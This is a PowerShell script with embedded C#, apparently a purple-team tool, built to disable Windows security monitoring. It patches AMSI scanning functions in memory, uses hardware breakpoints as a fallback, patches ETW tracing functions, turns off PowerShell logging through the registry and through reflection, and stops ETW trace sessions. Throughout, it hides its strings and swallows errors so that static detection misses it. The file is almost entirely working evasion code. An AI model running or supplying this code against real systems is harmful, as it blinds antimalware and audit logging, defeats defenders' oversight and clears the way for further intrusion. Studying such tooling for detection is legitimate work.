# Generate random namespace to avoid conflicts
$randomId = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$namespace = "Sec$randomId"

$RuntimeDefinition = @"
// Enhanced comprehensive evasion: Memory Patching + Hardware Breakpoint + ETW + Registry
// Original AMSI technique from @_EthicalChaos_ and @d_tranman
// Enhanced with comprehensive evasion techniques
// Modified by Marc Peacock for advanced purple team testing (19/08/2025)

using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace $namespace
{
    public class RuntimeManager
    {
        // AMSI bypass components
        static string[] libParts = {"am", "si", ".dl", "l"};
        static string[] procParts = {"Am", "siS", "can", "Buf", "fer"};
        static string[] procParts2 = {"Am", "siS", "can", "Buf", "fer", "A"};
        static string[] procParts3 = {"Am", "siS", "can", "Buf", "fer", "W"};
        static IntPtr BaseAddress = RuntimeAPI.LoadLibrary(string.Join("", libParts));
        static IntPtr pTargetFunc = RuntimeAPI.GetProcAddress(BaseAddress, string.Join("", procParts));
        static IntPtr pTargetFuncA = RuntimeAPI.GetProcAddress(BaseAddress, string.Join("", procParts2));
        static IntPtr pTargetFuncW = RuntimeAPI.GetProcAddress(BaseAddress, string.Join("", procParts3));
        static IntPtr pContextPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RuntimeAPI.DEBUG_CONTEXT64)));
        
        // ETW bypass components (expanded)
        static string[] etwLib = {"nt", "dll"};
        static string[] etwFunc1 = {"Nt", "Trace", "Event"};
        static string[] etwFunc2 = {"Etw", "Event", "Write"};
        static string[] etwFunc3 = {"Etw", "Write", "UMSec"};
        static string[] etwFunc4 = {"Etw", "Event", "Write", "Full"};
        static IntPtr hNtdll = RuntimeAPI.LoadLibrary(string.Join("", etwLib));
        static IntPtr pNtTraceEvent = RuntimeAPI.GetProcAddress(hNtdll, string.Join("", etwFunc1));
        static IntPtr pEtwEventWrite = RuntimeAPI.GetProcAddress(hNtdll, string.Join("", etwFunc2));
        static IntPtr pEtwWriteUMSec = RuntimeAPI.GetProcAddress(hNtdll, string.Join("", etwFunc3));
        static IntPtr pEtwEventWriteFull = RuntimeAPI.GetProcAddress(hNtdll, string.Join("", etwFunc4));
        
        // Status tracking
        static bool amsiMemoryPatched = false;
        static bool amsiHardwareSet = false;
        static bool etwPatched = false;
        static bool registryModified = false;
        
        public static void InitializeEnvironment()
        {
            try
            {
                // Layer 1: ETW bypass first (disable monitoring)
                ConfigureETWBypass();
                
                // Layer 2: Direct AMSI memory patching (primary method)
                PatchAMSIDirectly();
                
                // Layer 3: Hardware breakpoint fallback (redundancy)
                ConfigureAMSIBypass();
                
                // Layer 4: Registry-level logging disable
                DisableRegistryLogging();
                
                // Layer 5: PowerShell session manipulation
                ManipulatePowerShellSession();
            }
            catch
            {
                // Silent error handling
            }
        }
        
        private static void PatchAMSIDirectly()
        {
            try
            {
                // Direct memory patching of AMSI functions
                // Patch to return AMSI_RESULT_CLEAN (0) immediately
                byte[] patchBytes = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
                
                if (pTargetFunc != IntPtr.Zero)
                {
                    PatchFunction(pTargetFunc, patchBytes);
                }
                
                if (pTargetFuncA != IntPtr.Zero)
                {
                    PatchFunction(pTargetFuncA, patchBytes);
                }
                
                if (pTargetFuncW != IntPtr.Zero)
                {
                    PatchFunction(pTargetFuncW, patchBytes);
                }
                
                amsiMemoryPatched = true;
            }
            catch
            {
                // If memory patching fails, hardware breakpoint will handle it
            }
        }
        
        private static void PatchFunction(IntPtr functionAddress, byte[] patchBytes)
        {
            try
            {
                uint oldProtect, newProtect;
                
                // Change memory protection to allow writing
                RuntimeAPI.VirtualProtect(functionAddress, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);
                
                // Apply the patch
                Marshal.Copy(patchBytes, 0, functionAddress, patchBytes.Length);
                
                // Restore original protection
                RuntimeAPI.VirtualProtect(functionAddress, (UIntPtr)patchBytes.Length, oldProtect, out newProtect);
            }
            catch
            {
                // Silent error handling
            }
        }
        
        private static void ConfigureAMSIBypass()
        {
            try
            {
                RuntimeAPI.DEBUG_CONTEXT64 ctx = new RuntimeAPI.DEBUG_CONTEXT64();
                ctx.ContextFlags = RuntimeAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

                MethodInfo method = typeof(RuntimeManager).GetMethod("ExceptionHandler", BindingFlags.Static | BindingFlags.Public);
                IntPtr hExHandler = RuntimeAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
                
                Marshal.StructureToPtr(ctx, pContextPtr, true);
                bool success = RuntimeAPI.GetThreadContext((IntPtr)(-2), pContextPtr);
                ctx = (RuntimeAPI.DEBUG_CONTEXT64)Marshal.PtrToStructure(pContextPtr, typeof(RuntimeAPI.DEBUG_CONTEXT64));

                // Set breakpoints on all AMSI functions
                ConfigureBreakpoint(ctx, pTargetFunc, 0);
                if (pTargetFuncA != IntPtr.Zero)
                {
                    ConfigureBreakpoint(ctx, pTargetFuncA, 1);
                }
                if (pTargetFuncW != IntPtr.Zero)
                {
                    ConfigureBreakpoint(ctx, pTargetFuncW, 2);
                }
                
                RuntimeAPI.SetThreadContext((IntPtr)(-2), pContextPtr);
                amsiHardwareSet = true;
            }
            catch
            {
                // Silent error handling
            }
        }
        
        private static void ConfigureETWBypass()
        {
            try
            {
                // Comprehensive ETW function patching
                byte[] retPatch = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
                
                // Patch primary ETW functions
                if (pNtTraceEvent != IntPtr.Zero)
                {
                    PatchFunction(pNtTraceEvent, retPatch);
                }
                
                if (pEtwEventWrite != IntPtr.Zero)
                {
                    PatchFunction(pEtwEventWrite, retPatch);
                }
                
                // Patch additional ETW functions for comprehensive coverage
                if (pEtwWriteUMSec != IntPtr.Zero)
                {
                    PatchFunction(pEtwWriteUMSec, retPatch);
                }
                
                if (pEtwEventWriteFull != IntPtr.Zero)
                {
                    PatchFunction(pEtwEventWriteFull, retPatch);
                }
                
                etwPatched = true;
            }
            catch
            {
                // Silently continue if ETW patching fails
            }
        }
        
        private static void DisableRegistryLogging()
        {
            try
            {
                // Disable PowerShell script block logging via registry
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging", true))
                {
                    if (key != null)
                    {
                        key.SetValue("EnableScriptBlockLogging", 0);
                        key.SetValue("EnableScriptBlockInvocationLogging", 0);
                    }
                }
                
                // Disable module logging
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging", true))
                {
                    if (key != null)
                    {
                        key.SetValue("EnableModuleLogging", 0);
                    }
                }
                
                // Disable transcription
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription", true))
                {
                    if (key != null)
                    {
                        key.SetValue("EnableTranscripting", 0);
                        key.SetValue("EnableInvocationHeader", 0);
                    }
                }
                
                registryModified = true;
            }
            catch
            {
                // Registry access might fail due to permissions
            }
        }
        
        private static void ManipulatePowerShellSession()
        {
            try
            {
                // Additional PowerShell session manipulation
                var assembly = Assembly.GetAssembly(typeof(System.Management.Automation.PSObject));
                if (assembly != null)
                {
                    var amsiUtils = assembly.GetType("System.Management.Automation.AmsiUtils");
                    if (amsiUtils != null)
                    {
                        var amsiInitFailed = amsiUtils.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
                        if (amsiInitFailed != null)
                        {
                            amsiInitFailed.SetValue(null, true);
                        }
                        
                        var amsiContext = amsiUtils.GetField("amsiContext", BindingFlags.NonPublic | BindingFlags.Static);
                        if (amsiContext != null)
                        {
                            amsiContext.SetValue(null, IntPtr.Zero);
                        }
                        
                        var amsiSession = amsiUtils.GetField("amsiSession", BindingFlags.NonPublic | BindingFlags.Static);
                        if (amsiSession != null)
                        {
                            amsiSession.SetValue(null, null);
                        }
                    }
                    
                    // Manipulate group policy settings
                    var utils = assembly.GetType("System.Management.Automation.Utils");
                    if (utils != null)
                    {
                        var cachedGroupPolicySettings = utils.GetField("cachedGroupPolicySettings", BindingFlags.NonPublic | BindingFlags.Static);
                        if (cachedGroupPolicySettings != null)
                        {
                            var settings = cachedGroupPolicySettings.GetValue(null);
                            if (settings != null && settings is System.Collections.IDictionary dict)
                            {
                                dict["ScriptBlockLogging"] = new System.Collections.Hashtable 
                                { 
                                    ["EnableScriptBlockLogging"] = 0,
                                    ["EnableScriptBlockInvocationLogging"] = 0
                                };
                                dict["ModuleLogging"] = new System.Collections.Hashtable 
                                { 
                                    ["EnableModuleLogging"] = 0
                                };
                                dict["Transcription"] = new System.Collections.Hashtable 
                                { 
                                    ["EnableTranscripting"] = 0
                                };
                            }
                        }
                    }
                }
            }
            catch
            {
                // Silent error handling
            }
        }
        
        public static long ExceptionHandler(IntPtr exceptions)
        {
            try
            {
                RuntimeAPI.RUNTIME_POINTERS ep = new RuntimeAPI.RUNTIME_POINTERS();
                ep = (RuntimeAPI.RUNTIME_POINTERS)Marshal.PtrToStructure(exceptions, typeof(RuntimeAPI.RUNTIME_POINTERS));

                RuntimeAPI.PROCESS_RECORD ExceptionRecord = new RuntimeAPI.PROCESS_RECORD();
                ExceptionRecord = (RuntimeAPI.PROCESS_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(RuntimeAPI.PROCESS_RECORD));

                RuntimeAPI.DEBUG_CONTEXT64 ContextRecord = new RuntimeAPI.DEBUG_CONTEXT64();
                ContextRecord = (RuntimeAPI.DEBUG_CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(RuntimeAPI.DEBUG_CONTEXT64));

                // Handle breakpoints on any AMSI function
                if (ExceptionRecord.ExceptionCode == RuntimeAPI.EXCEPTION_SINGLE_STEP && 
                    (ExceptionRecord.ExceptionAddress == pTargetFunc || 
                     ExceptionRecord.ExceptionAddress == pTargetFuncA || 
                     ExceptionRecord.ExceptionAddress == pTargetFuncW))
                {
                    ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);
                    IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8)));

                    Marshal.WriteInt32(ScanResult, 0, RuntimeAPI.SCAN_RESULT_CLEAN);

                    ContextRecord.Rip = ReturnAddress;
                    ContextRecord.Rsp += 8;
                    ContextRecord.Rax = 0;
                    
                    Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true);
                    return RuntimeAPI.EXCEPTION_CONTINUE_EXECUTION;
                }
                else
                {
                    return RuntimeAPI.EXCEPTION_CONTINUE_SEARCH;
                }
            }
            catch
            {
                return RuntimeAPI.EXCEPTION_CONTINUE_SEARCH;
            }
        }

        public static void ConfigureBreakpoint(RuntimeAPI.DEBUG_CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, pContextPtr, true);
        }

        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
        
        // Enhanced status check method
        public static string GetBypassStatus()
        {
            return string.Format("Memory:{0}, Hardware:{1}, ETW:{2}, Registry:{3}", 
                amsiMemoryPatched ? "PATCHED" : "FAILED",
                amsiHardwareSet ? "SET" : "FAILED",
                etwPatched ? "PATCHED" : "FAILED",
                registryModified ? "MODIFIED" : "FAILED");
        }
    }

    public class RuntimeAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 SCAN_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct DEBUG_CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] 
            public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RUNTIME_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
"@

try {
    # Obfuscated execution to reduce static detection
    $TypeCommand = "Add" + "-" + "Type"
    $Parameters = @{
        TypeDefinition = $RuntimeDefinition
        ErrorAction = 'SilentlyContinue'
    }

    & $TypeCommand @Parameters

    # Initialize comprehensive bypass using dynamic namespace
    $runtimeType = "$namespace.RuntimeManager" -as [type]
    if ($runtimeType) {
        $runtimeType::InitializeEnvironment()
        
        # Optional status check (uncomment to view results)
        # Write-Host "Bypass Status: $($runtimeType::GetBypassStatus())" -ForegroundColor Green
    }

    # Enhanced ETW provider cleanup
    try {
        $etwProviders = @(
            "Microsoft-Windows-PowerShell",
            "Microsoft-Windows-Threat-Intelligence", 
            "Microsoft-Windows-Kernel-EventTracing",
            "Microsoft-Antimalware-Scan-Interface",
            "Microsoft-Windows-WinINet-Capture",
            "Microsoft-Windows-DNS-Client"
        )
        
        foreach ($provider in $etwProviders) {
            try {
                logman stop $provider -ets 2>$null | Out-Null
            } catch {}
        }
    } catch {}
    
} catch {
    # Silent error handling
}
